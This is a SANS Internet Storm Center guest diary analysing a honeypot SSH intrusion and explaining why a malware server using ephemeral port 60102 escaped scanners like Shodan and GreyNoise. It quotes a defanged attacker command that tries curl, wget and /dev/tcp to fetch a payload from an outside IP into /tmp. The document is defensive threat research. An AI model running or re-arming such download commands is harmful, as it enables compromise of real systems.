---
title: &#x5b;Guest Diary&#x5d; Malware Source Servers: The Threat of Attackers Using Ephemeral Ports as Service Ports to Upload Data, (Wed, Feb 26th)
url: https://isc.sans.edu/diary/rss/31710
source: SANS Internet Storm Center, InfoCON: green
date: 2025-02-27
fetch_date: 2025-10-06T20:39:21.349813
---

# &#x5b;Guest Diary&#x5d; Malware Source Servers: The Threat of Attackers Using Ephemeral Ports as Service Ports to Upload Data, (Wed, Feb 26th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31706)
* [next](/diary/31712)

# [[Guest Diary] Malware Source Servers: The Threat of Attackers Using Ephemeral Ports as Service Ports to Upload Data](/forums/diary/Guest%2BDiary%2BMalware%2BSource%2BServers%2BThe%2BThreat%2Bof%2BAttackers%2BUsing%2BEphemeral%2BPorts%2Bas%2BService%2BPorts%2Bto%2BUpload%2BData/31710/)

**Published**: 2025-02-26. **Last Updated**: 2025-02-26 14:22:44 UTC
**by** [Robin Zaheer, SANS.edu BACS Student](/handler_list.html#robin-zaheer,-sans.edu-bacs-student) (Version: 1)

[2 comment(s)](/diary/Guest%2BDiary%2BMalware%2BSource%2BServers%2BThe%2BThreat%2Bof%2BAttackers%2BUsing%2BEphemeral%2BPorts%2Bas%2BService%2BPorts%2Bto%2BUpload%2BData/31710/#comments)

[This is a Guest Diary by Robin Zaheer, an ISC intern as part of the SANS.edu Bachelor's Degree in Applied Cybersecurity (BACS) program [1].]

During my time as an intern with SANS Internet Storm Center [2], my DShield honeypot has seen a variety of attacks that prove to be interesting case studies. Most commonly, I have seen thousands upon thousands of password guessing attacks, for which the ISC provides a nifty webpage [3] that displays the top source IPs, usernames, and passwords used in said attacks observed by my honeypot for SSH/Telnet. Here is a snapshot of that page:

**![](https://isc.sans.edu/diaryimages/images/2025-02-26_figure1_v2.png)
Figure 1: Data from my DShield honeypot on top source IPs, passwords, and usernames used in SSH login attempts for the current day.**

These attacks are most certainly worth studying, but I think the attacks that occur after the attackers succeed in their password guessing draw my interest the most. After all, attacker behavior is most easily studied when they are given the access necessary to attempt what they mean to do within a target system. The attack I wish to focus on today utilizes a cloud IP that has remained undetected by malicious IP identifiers. It started with the following password guessing attack:

**![](https://isc.sans.edu/diaryimages/images/2025-02-26_figure2.PNG)
Figure 2: Excerpt from cowrie JSON log detailing successful password guessing attack from source IP [8.133.192.98](/ipinfo.html?ip=8.133.192.98).**

The attack then went as follows:

**![](https://isc.sans.edu/diaryimages/images/2025-02-26_figure3.PNG)
Figure 3: TTY log generated by SSH session from Figure 2 and accessed using playlog command. Displays cowrie-interpreted inputs and command line outputs.**

This attack took eight seconds, or thirteen if you include the time it took for the attacker to log in with the password guessing attack. In that time, a very complex command is inputted using nohup. The whole command is worth dissecting to understand what the attacker is attempting to do, but I will focus on the following defanged segment of that command:

```

curl hxxp[://]140[.]143[.]196[.]172[:]60102/linux -o /tmp/TTqYvYlyMT; if [ ! -f /tmp/TTqYvYlyMT ]; \
then wget hxxp[://]140[.]143[.]196[.]172[:]60102/linux -O /tmp/TTqYvYlyMT; fi; if [ ! -f /tmp/TTqYvYlyMT ]; \
then exec 6<>/dev/tcp/140[.]143[.]196[.]172/60102 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/TTqYvYlyMT
```

This piece of code tries to connect to and download data from another IP address three different ways: curl, wget, and 6<>/dev/tcp. The commonality between them is some version of trying to connect with the URL **`hxxp[://]140[.]143[.]196[.]172[:]60102/linux`** and writing the response into a file. This has struck me as the most interesting piece of the entire attack, as it entails connecting to the **IP [140.143.196.172](/ipinfo.html?ip=140.143.196.172)** with HTTP, but through the ephemeral **[port 60102](/port/60102)** instead of **[port 80](/port/80)** or another common service port. However, when I attempted to gather information about this IP’s past behavior, I got little information. See the table below:

| Results | Shodan [4] | GreyNoise [5] | AbuseIPDB [6] | SANS ISC [7] |
| --- | --- | --- | --- | --- |
| Malicious? | No Results | No results | 0% Confidence of Abuse | Risk 0 |
| Reported Activity | N/A | N/A | Three reports of SSH activity on 13 July 2024 | No reports, listed on Port 22 Scanner feed between 13-15 July 2024 |

**Figure 4: Results of searching for the IP the attacker attempted to download files from.**

What is known about this IP is that it is based in Shanghai, China, and is owned by Tencent Cloud Computing Co., Ltd [6][7]. Even the ISC has no reports on this IP, only listing it in the Port 22 Scanner feed from six months ago [7], which is also the only time when AbuseIPDB reported potentially malicious activity from the IP [7].

I believe this means that the server tied to this IP is not normally used for common port scanning; it is only used as a location for attackers to access their malware and download to a compromised system. As of 17 January, 2025, what little information there is about this IP comes from a period of time it was used as an attacking system, whereas now it is a place of access for malware files. Essentially, this host is not an actively malicious system, but it remains a passive threat that aids threat actors in their attacks when needed. This could also make tracking down the stored malware much more difficult to identify and classify, especially at scale. With automated and wide-ranging web scanners like Shodan and GreyNoise failing to identify this threat, many more systems just like it can run under the radar until an analyst personally identifies its purpose. By running a service through an ephemeral port, web scanners are likely to not include that port in the range of ports that they scan on any given host. Additionally, the use of a nonstandard port for HTTP implies that the ability to connect to the server is tied to a service that the attacker crafted or manipulated for control, and that the opening of those ports are temporary(and therefore much more difficult to catch by web scanner), unlike the common service ports.There are examples of actively running HTTP services on malicious systems using nonstandard ports, see below:

![](https://isc.sans.edu/diaryimages/images/2025-02-26_figure5.png)
**Figure 5: Snapshot of HTTP service responses on nonstandard ports. Sourced from Shodan query for IP [220.180.76.126](/ipinfo.html?ip=220.180.76.126).**

While the ports for the HTTP services shown in Figure 5 are numbered below **[port 10000](/port/10000)**, the TCP port used in the attack is **[port 60102](/port/60102)**. This explains why Shodan would not be able to see the service, even if the service was actively running. According to the founder of Shodan(username “achillean”), the web scanner scans from a list of ports for all public IPv4 addresses [8]. That list of ports, pulled from Shodan’s API, includes only a fraction of all ports and does not include **[port 60102](/port/60102)** despite including some port numbers typically reserved for ephemeral port usage [9]. It is also worth noting that these responses were logged on certain days based on the date of the response headers, but have not given a more recent response, likely meaning that the services are not active at all times. GreyNoise, on the other hand, would never detect activity for the host of **[140.143.196.172](/ipinfo.html?ip=140.143.196.172)** due to the way it collects data. According to its creator, it utilizes honeypot servers placed on several cloud providers to collect data much like how DShield collects data, logging access attempts and port scanning [10][11]. GreyNoise passively collects activity, so unless a threat actor attempts to attack one of their honeypots, activity like the above attack would not be logged. For comparison, GreyNoise does label the attacker’s originating IP **[8.133.192.98](/ipinfo.html?i...